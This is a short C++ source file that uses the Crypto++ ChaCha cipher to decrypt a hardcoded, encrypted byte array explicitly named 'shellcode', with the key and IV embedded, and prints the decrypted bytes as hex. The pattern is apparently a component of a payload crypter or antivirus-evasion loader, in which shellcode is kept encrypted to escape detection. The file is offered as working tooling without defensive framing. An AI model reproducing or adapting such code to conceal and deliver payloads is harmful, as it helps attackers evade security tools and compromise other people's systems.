
#include <iostream>
#include <string>
#include <chacha.h>
#include <random>

using namespace std;


int Decryptor()
{
	unsigned char shellcode[] = { 0x1a,0xc6,0xbe,0x43,0xe5,0xc2,0xa5,0xeb,0x54,0xf5,0x96,0x64,0x3,0xaf,0x92,0x8f,0x5,0x58,0x57,0x80,0x59,0xaa,0x66,0x17,0x4a,0x4f,0x5f,0x21,0x75,0xd6,0x7d,0x78,0xb4,0x6f,0x98,0x85,0x7b,0xa2,0x9c,0x50,0xed,0xf7,0x38,0x15,0xcc,0x1a,0x57,0xb3,0x39,0x40,0x59,0x3b,0x77,0xf8,0x13,0x7d,0x40,0xbc,0xc0,0x6d,0x88,0x18,0xd6,0xd2,0x8c,0x8e,0x51,0x8c,0xd7,0xa1,0x27,0xef,0xf1,0x7,0x3,0x43,0x5a,0x44,0xa9,0xee,0xcf,0x2c,0xb3,0x62,0xb2,0xdb,0x3a,0x5c,0x5a,0xe2,0xe4,0xe0,0xc5,0x89,0xa9,0xdb,0x1a,0xd7,0x85,0x2a,0xb4,0xd5,0xe7,0x5b,0x13,0x8f,0xe2,0x24,0xd9,0xb7,0x52,0xd6,0x7b,0x8c,0xb9,0xcb,0x22,0xbb,0x72,0x8b,0xde,0xf9,0x5f,0xbd,0xa3,0x38,0x9f,0x7b,0x5b,0x98,0x37,0x30,0xa,0x74,0x21,0x25,0x46,0x44,0xaf,0x43,0x81,0x4b,0xad,0x4c,0x2a,0x6e,0x59,0x65,0x86,0x93,0xf2,0x63,0x67,0xf0,0x4b,0xcb,0x7e,0xcc,0xb3,0x27,0xa,0xb1,0x3a,0xc9,0xdd,0x9,0x5a,0xb4,0x5d,0xe1,0x84,0xee,0x59,0x11,0x86,0xdb,0x5d,0x56,0xe2,0xe2,0x78,0x77,0xe6,0x35,0xf,0x97,0x4c,0xd6,0xb6,0x7c,0x8f,0x97,0x32,0xb1,0xdd,0x78,0x3b,0x32,0x22,0x82,0x70,0x79,0x3,0x25,0x68,0x6d,0x31,0x70,0xe7,0x5,0xbc,0xe2,0xda,0xc3,0x43,0xd7,0x14,0xff,0x71,0xde,0x29,0x40,0x62,0x13,0x31,0x65,0x3c,0x69,0xfe,0x3,0x96,0xca,0x5a,0x83,0x4a,0xcc,0xaa,0xc9,0x17,0xa6,0xe,0xc1,0x3b,0xac,0xc,0x6b,0xcf,0xd3,0xe4,0xa7,0x48,0x27,0x60,0xd9,0xa6,0x1a,0x45,0xd8,0x79,0xd0,0x89,0xf5,0x46,0xb8,0x53,0x70,0xab,0xc,0xd8,0x52,0x63,0xfd,0xd1,0x95,0x5e,0xeb,0xc5,0xf,0x1e,0x2f,0x49,0xa3,0xe1,0xed,0xdb,0x79,0x77,0xf8 };

	unsigned char key[CryptoPP::ChaCha::MAX_KEYLENGTH] = { 0xd4,0x3e,0x67,0x43,0xa,0x4f,0xa9,0xa,0x74,0xae,0x42,0x29,0x78,0xb2,0x13,0xea,0x97,0xb0,0x3a,0x89,0x85,0xed,0x65,0xb0,0x88,0x64,0xa1,0xdc,0xd2,0x39,0x41,0x27 };
	unsigned char iv[CryptoPP::ChaCha::IV_LENGTH] = { 0x9a,0x17,0x3,0xaa,0xd0,0xff,0xa4,0xb8 };
	unsigned char plaintext[sizeof(shellcode)];

	CryptoPP::ChaCha::Decryption chacha;

	chacha.SetKeyWithIV(key, sizeof(key), iv, sizeof(iv));

	chacha.ProcessData(plaintext, shellcode, sizeof(shellcode));


	for (int i = 0; i < sizeof(shellcode); i++)
	{
		std::cout <<"0x"<< std::hex << (int)plaintext[i] << ",";
	}
	std::cout << std::endl;

	return 0;
}